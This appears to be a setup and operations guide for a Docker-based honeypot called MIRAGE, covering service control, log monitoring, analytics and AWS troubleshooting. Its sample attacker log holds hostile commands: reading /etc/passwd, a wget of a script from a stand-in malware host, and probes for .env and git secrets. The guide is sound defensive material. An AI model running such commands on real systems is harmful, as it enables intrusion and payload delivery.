02

Start the MIRAGE System

From inside the MIRAGE Project folder on your server:

sudo docker compose up -d

This starts 4 services in the background:

ServicePortPurpose
Cowrie2222SSH honeypot — traps attackers who try to SSH in
Decoy8080Fake vulnerable website — traps web scanners
Ingestion—Watches Cowrie logs, writes data to database
Dashboard5000Your command center UI to view captured data

To rebuild after any code changes:

sudo docker compose up -d --build
03

Stop the MIRAGE System

To stop all services (data is preserved):

sudo docker compose down

To stop AND delete all data (complete reset):

sudo docker compose down -v
⚠️ The -v flag deletes the database volume. All captured attacker data will be permanently lost.

Check for Real Attackers

Quick check — Last 50 Cowrie events

sudo docker logs mirage-cowrie --tail 50

Watch attacks happen in real time

sudo docker logs mirage-cowrie -f

Press Ctrl+C to stop watching.

What to look for in the logs

A real attacker connecting:

New connection: 185.220.101.xx:54321 (...)
login attempt [root/admin] succeeded

An attacker typing commands after "logging in":

CMD: uname -a
CMD: cat /etc/passwd
CMD: wget http://malware-site.com/bot.sh

View Decoy Web App Logs

See who is scanning your fake website

sudo docker logs mirage-decoy --tail 50

Watch web scans in real time

sudo docker logs mirage-decoy -f

What to look for:

"GET /.env HTTP/1.1" 200           ← Scanner looking for credentials
"GET /.git/config HTTP/1.1" 200    ← Scanner looking for exposed git repos
"POST /login HTTP/1.1" 200         ← Bot trying to log in
"GET /debug/config HTTP/1.1" 200  ← Scanner found the JWT secret leak!
07

Run the Analytics Pipeline

After your system has captured real attacker data, run the analytics engine to cluster attackers into campaigns, tag sessions with MITRE ATT&CK techniques, and classify sessions as bot vs. human:

sudo docker compose exec dashboard python -m analytics.run_analytics
💡 Run this command periodically (every few hours or once a day) to keep the dashboard analysis up to date with the latest captured data.

Troubleshooting

"Connection timed out" when SSHing

Cause: AWS security group doesn't allow SSH (port 22).

Fix: Go to AWS Console → EC2 → Security Groups → Edit Inbound Rules → Add SSH from Anywhere.

Dashboard not loading in browser

Cause: Port 5000 not open in AWS firewall.

Fix: Go to AWS Console → EC2 → Security Groups → Edit Inbound Rules → Add Custom TCP port 5000 from Anywhere.

Container keeps restarting

Check the error logs:

sudo docker logs mirage-dashboard --tail 30

SSH session disconnects after a while

Cause: Normal — idle SSH connections time out.

Fix: Reconnect using the same SSH command from Section 1.

No attackers showing up after 24+ hours

  1. Check if Cowrie is running: sudo docker compose ps
  2. Verify port 2222 is open in your AWS Security Group inbound rules
  3. Check Cowrie logs for any errors: sudo docker logs mirage-cowrie --tail 30
